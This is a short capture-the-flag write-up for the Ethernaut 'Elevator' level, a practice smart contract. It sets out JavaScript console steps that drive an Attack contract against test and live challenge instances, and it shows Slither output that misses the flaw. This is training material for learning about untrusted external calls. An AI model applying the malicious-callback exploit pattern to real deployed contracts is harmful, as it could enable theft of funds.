# Elevator

[Elevator](https://ethernaut.openzeppelin.com/level/0x4A151908Da311601D967a6fB9f8cFa5A3E88a251)


`Elevator` calls into a malicious contract, which customizes its response to exploit the caller.


<BR />

## Test Attack

```JS
el = await Elevator.deployed()
attack = await Attack.deployed()

await el.top()
await attack.goTo(11)
await el.top()
```

<BR />

## Live Attack

```JS
el = await Elevator.at("0xaef17A18bd4ec8abCE38EeE6B054242a69482D11")
attack = await Attack.deployed()

await el.top()
await attack.goTo(11)
await el.top()
```


<BR />


## Vulnerability Testing Tools


<BR />

### Slither

Not Detected.

```BASH
solc-select use 0.8.0
slither ./contracts/Elevator.sol  --truffle-ignore-compile  --exclude-optimization 
```

```
Pragma version^0.8.0 (contracts/Building.sol#2) allows old versions
Pragma version^0.8.0 (contracts/Elevator.sol#2) allows old versions
solc-0.8.0 is not recommended for deployment
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity

Parameter Elevator.goTo(uint256)._floor (contracts/Elevator.sol#10) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions
./contracts/Elevator.sol analyzed (2 contracts with 76 detectors), 4 result(s) found
```
